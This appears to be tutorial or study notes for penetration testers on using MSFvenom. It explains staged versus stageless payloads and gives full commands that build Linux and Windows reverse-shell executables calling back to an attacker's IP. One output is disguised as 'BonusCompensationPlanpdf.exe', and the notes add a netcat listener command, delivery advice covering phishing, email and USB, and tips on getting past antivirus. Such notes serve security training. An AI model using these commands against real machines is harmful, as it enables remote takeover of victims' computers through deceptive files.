## 1. What is MSFvenom?

**MSFvenom** is a standalone payload generator that is part of the Metasploit framework. It is used when you do not have direct network access to launch an automated exploit, requiring you to manually craft a payload (like an `.exe` or `.elf` file) and deliver it yourself (e.g., via social engineering, phishing emails, or file uploads).

* *Bonus:* It can also encrypt and encode payloads to help bypass basic antivirus signatures.

## 2. Staged vs. Stageless Payloads

Understanding the difference dictates how your payload executes and how reliable your connection will be.

| Feature | Staged Payload | Stageless Payload |
| --- | --- | --- |
| **How it works** | Sends a small "stage" first, which then calls back to the attacker to download and execute the rest of the shellcode. | The entire payload (shellcode + network communications) is sent as a single, complete package. |
| **Naming Convention** | Separated by slashes (`/`). <br>

<br> Example: `windows/meterpreter/reverse_tcp` | Combined together. <br>

<br> Example: `windows/meterpreter_reverse_tcp` |
| **Pros/Cons** | Great for exploits with strict memory/size limits. Can be unstable on high-latency/low-bandwidth networks. | highly stable, great for social engineering/phishing. Has a larger initial file size. |

## 3. Building a Stageless Payload (Linux)

To create a Linux executable binary (`.elf`) that initiates a reverse shell when run:

* **Command:**
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

```


* **Breakdown:**
* `-p`: Specifies the payload to use.
* `linux/x64/shell_reverse_tcp`: The specific Linux 64-bit stageless TCP reverse shell payload.
* `LHOST`: The attacker's IP to connect back to.
* `LPORT`: The attacker's listening port.
* `-f elf`: Format to generate the payload in (ELF = Executable and Linkable Format for Linux).
* `> createbackup.elf`: Outputs and names the file.



## 4. Building a Stageless Payload (Windows)

To create a Windows executable binary (`.exe`) that initiates a reverse shell when run:

* **Command:**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe

```


* **Breakdown:**
* `-p windows/shell_reverse_tcp`: The Windows 32-bit (x86) stageless TCP reverse shell payload.
* `-f exe`: Format to generate the payload in (Windows Executable).


* *Note on AV:* A raw, unencoded `.exe` payload generated by MSFvenom will be caught immediately by Windows Defender or any modern AV. You must encode or obfuscate it for real-world usage.

## 5. Executing the Payload

1. **Set up the Listener:** On your attack box, start Netcat to catch the connection:
```bash
sudo nc -lvnp 443

```


2. **Deliver & Execute:** Get the file onto the target machine (via email, USB, file upload vulnerability) and get it executed. You will receive an interactive shell in your Netcat window.
